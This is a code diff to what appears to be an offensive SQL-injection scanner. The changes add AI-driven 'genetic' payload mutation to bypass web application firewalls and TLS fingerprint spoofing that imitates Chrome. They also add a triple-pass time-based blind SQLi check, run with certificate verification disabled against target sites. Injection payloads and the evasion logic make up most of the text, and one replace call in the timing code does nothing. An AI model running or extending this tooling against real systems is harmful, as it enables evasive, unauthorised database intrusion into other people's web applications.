@@ -20,7 +20,6 @@ Usage:
     aura www.target.com --sqli --map reports/discovery_map_target.json
 """
 
-import asyncio
 import json
 import os
 import re
@@ -30,9 +29,13 @@ from datetime import datetime
 from pathlib import Path
 from typing import Optional
 
-import httpx
 import urllib3
+from curl_cffi import requests as curlr
 urllib3.disable_warnings()
+
+from aura.core.brain import AuraBrain
+from aura.core.genetic_bypass import GeneticWAFBypass
+from aura.ui.zenith_ui import ZenithUI
 
 # ─── Payload Libraries ────────────────────────────────────────────────────────
 
@@ -131,22 +134,56 @@ class SQLiEngine:
                 cookies[k.strip()] = v.strip()
         return cookies
 
-    def _request(self, method: str, url: str, timeout: Optional[int] = None) -> tuple[Optional[httpx.Response], float]:
-        """Makes a request and returns (response, elapsed_seconds)."""
+    def _request(self, method: str, url: str, timeout: Optional[int] = None, original_payload: Optional[str] = None) -> tuple[Optional[curlr.Response], float]:
+        """Makes a request, wrapped in the AI Genetic Mutation Loop."""
         t0 = time.monotonic()
+        
+        # We simulate a "session" object that the GeneticWAFBypass expects
+        class DummySession:
+            def __init__(self, cookies, parent_timeout):
+                self.cookies = cookies
+                self.timeout = parent_timeout
+            async def request(self, req_method, req_url, **kwargs):
+                return curlr.request(
+                    method=req_method,
+                    url=req_url,
+                    cookies=self.cookies,
+                    timeout=kwargs.get("timeout", self.timeout),
+                    verify=False,
+                    allow_redirects=True,
+                    impersonate="chrome124", 
+                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"},
+                    **{k:v for k,v in kwargs.items() if k not in ["timeout", "original_payload"]}
+                )
+
+        import asyncio
+        brain = AuraBrain()
+        waf_bypass = GeneticWAFBypass(brain, DummySession(self.cookies, timeout or self.timeout))
+
         try:
-            resp = httpx.request(
+            if original_payload:
+                # Use the AI bypass loop
+                response, was_bypassed = asyncio.run(waf_bypass.bypass_and_retry(
+                    method, 
+                    url, 
+                    original_payload=original_payload
+                ))
+                resp = response
+            else:
+                # Standard stealth request
+                resp = curlr.request(
                 method=method,
                 url=url,
                 cookies=self.cookies,
                 timeout=timeout or self.timeout,
                 verify=False,
-                follow_redirects=True,
-                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
+                allow_redirects=True,
+                impersonate="chrome124",  # v6.0 TLS JA3/JA4 Spoofing
+                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"},
             )
             elapsed = time.monotonic() - t0
             return resp, elapsed
-        except httpx.TimeoutException:
+        except curlr.RequestsError:
             elapsed = time.monotonic() - t0
             return None, elapsed
         except Exception:
@@ -208,7 +245,7 @@ class SQLiEngine:
         error_payloads = ["'", '"', "\\", "1'1", "' OR ''='"]
         for payload in error_payloads:
             injected_url = self._inject_param(url, param, payload)
-            resp, _ = self._request("GET", injected_url)
+            resp, _ = self._request("GET", injected_url, original_payload=payload)
             if resp and ERROR_PATTERN.search(resp.text):
                 db_type = "Unknown"
                 for err_pattern in ERROR_SIGNATURES:
@@ -247,8 +284,8 @@ class SQLiEngine:
             true_url  = self._inject_param(url, param, true_p)
             false_url = self._inject_param(url, param, false_p)
 
-            true_resp,  _ = self._request("GET", true_url)
-            false_resp, _ = self._request("GET", false_url)
+            true_resp,  _ = self._request("GET", true_url, original_payload=true_p)
+            false_resp, _ = self._request("GET", false_url, original_payload=false_p)
 
             if not true_resp or not false_resp:
                 continue
@@ -279,30 +316,47 @@ class SQLiEngine:
 
     def _test_time_based(self, url: str, param: str) -> Optional[dict]:
         """
-        The most reliable SQLi test.
-        Sends a payload with SLEEP(5) / WAITFOR DELAY '0:0:5' and measures response time.
+        v30.0 OMEGA: Adaptive Triple-Pass Verification.
+        Eliminates network lag false positives by verifying scaling.
+        1. SLEEP(5) -> 2. SLEEP(2) -> 3. Control (0s)
         """
-        # Baseline request to know normal latency
+        # Baseline request
         baseline_url = self._inject_param(url, param, "1")
         _, baseline_time = self._request("GET", baseline_url)
 
         for db_name, payloads in TIMEBASED_PAYLOADS.items():
-            for payload in payloads[:2]:  # Test first 2 per DB
-                injected_url = self._inject_param(url, param, payload)
-                _, elapsed = self._request("GET", injected_url, timeout=TIME_DELAY + 10)
-
-                delay_observed = elapsed - baseline_time
-                if delay_observed >= TIME_THRESHOLD:
-                    return {
-                        "method": "Time-Based Blind SQLi",
-                        "payload": payload,
-                        "db_type": db_name,
-                        "observed_delay_sec": round(elapsed, 2),
-                        "baseline_sec": round(baseline_time, 2),
-                        "severity": "CRITICAL",
-                        "cvss_score": 9.8,
-                        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
-                    }
+            for payload_template in payloads[:1]:
+                # --- PASS 1: Long Sleep (5s) ---
+                p5 = payload_template.replace("5", "5")
+                url5 = self._inject_param(url, param, p5)
+                _, t5 = self._request("GET", url5, timeout=15)
+                
+                if (t5 - baseline_time) >= 4.0:
+                    # --- PASS 2: Short Sleep (2s) ---
+                    # We expect around 2s delay
+                    p2 = payload_template.replace("5", "2")
+                    url2 = self._inject_param(url, param, p2)
+                    _, t2 = self._request("GET", url2, timeout=10)
+                    
+                    if 1.5 <= (t2 - baseline_time) <= 3.5:
+                        # --- PASS 3: Control Pass (No Sleep) ---
+                        # We expect near-baseline performance
+                        p0 = "1" # Constant value
+                        url0 = self._inject_param(url, param, p0)
+                        _, t0 = self._request("GET", url0, timeout=10)
+                        
+                        if (t0 - baseline_time) < 1.0:
+                            # ALL PASSES SUCCESSFUL -> 100% CONFIRMED HIT
+                            return {
+                                "method": "Time-Based Blind SQLi (Triple-Pass Verified)",
+                                "payload": p5,
+                                "db_type": db_name,
+                                "observed_delay_5s": round(t5, 2),
+                                "observed_delay_2s": round(t2, 2),
+                                "severity": "CRITICAL",
+                                "cvss_score": 9.8,
+                                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+                            }
         return None
 
     def test_parameter(self, param_info: dict) -> Optional[dict]:
@@ -315,33 +369,31 @@ class SQLiEngine:
             return None
         self.tested.add(dedup_key)
 
-        print(f"\n  🔍 [{param_info['method']}] [{param}] in {url[:70]}")
+        with ZenithUI.status(f"Injecting payloads into {param} in {url[:50]}..."):
+            # 1. Error-based (fastest)
+            result = self._test_error_based(url, param)
+            if result:
+                ZenithUI.finding(f"Error-Based SQLi ({result['db_type']})", result['severity'], self.target_domain)
+                finding = self._build_finding(param_info, result)
+                self.findings.append(finding)
+                return finding
 
-        # 1. Error-based (fastest)
-        result = self._test_error_based(url, param)
-        if result:
-            print(f"     🚨 Error-Based SQLi! DB={result['db_type']} — payload: {result['payload']}")
-            finding = self._build_finding(param_info, result)
-            self.findings.append(finding)
-            return finding
+            # 2. Boolean-based
+            result = self._test_boolean_based(url, param)
+            if result:
+                ZenithUI.finding(f"Boolean-Based SQLi", result['severity'], self.target_domain)
+                finding = self._build_finding(param_info, result)
+                self.findings.append(finding)
+                return finding
 
-        # 2. Boolean-based
-        result = self._test_boolean_based(url, param)
-        if result:
-            print(f"     🚨 Boolean-Based SQLi! TRUE:{result['response_len_true']} vs FALSE:{result['response_len_false']} bytes")
-            finding = self._build_finding(param_info, result)
-            self.findings.append(finding)
-            return finding
+            # 3. Time-based (slowest but most reliable)
+            result = self._test_time_based(url, param)
+            if result:
+                ZenithUI.finding(f"Time-Based SQLi ({result['db_type']})", result['severity'], self.target_domain)
+                finding = self._build_finding(param_info, result)
+                self.findings.append(finding)
+                return finding
 
-        # 3. Time-based (slowest but most reliable)
-        result = self._test_time_based(url, param)
-        if result:
-            print(f"     🚨 Time-Based SQLi! DB={result['db_type']} Delay={result['observed_delay_sec']}s (baseline {result['baseline_sec']}s)")
-            finding = self._build_finding(param_info, result)
-            self.findings.append(finding)
-            return finding
-
-        print(f"     ✅ No SQLi detected")
         return None
 
     def _build_finding(self, param_info: dict, result: dict) -> dict:
